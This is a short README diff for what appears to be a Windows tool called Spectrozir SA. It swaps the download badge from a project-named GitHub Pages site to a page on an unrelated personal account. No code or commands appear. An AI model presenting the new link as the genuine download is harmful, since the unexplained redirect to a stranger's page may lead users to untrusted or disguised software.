@@ -4,11 +4,7 @@
   <img src="https://spectrozir.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fpro_entry.9d1f9f07.jpg&w=3840&q=75" width="820" alt="Spectrozir SA Interface">
 </div>
 
-<p align="center">
-  <a href="https://sa-spectrozir.github.io/.github">
-    <img src="https://img.shields.io/badge/Скачать_SPECTROZIR_SA-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Скачать SPECTROZIR SA">
-  </a>
-</p>
+[![GET SA SPECTROZIR](https://img.shields.io/badge/GET%20%E2%80%94%20SA-SPECTROZIR-0078D6?style=for-the-badge&logoColor=white)](https://toddblue03.github.io/.github/SA-SPECTROZIR)
 
 ---
 
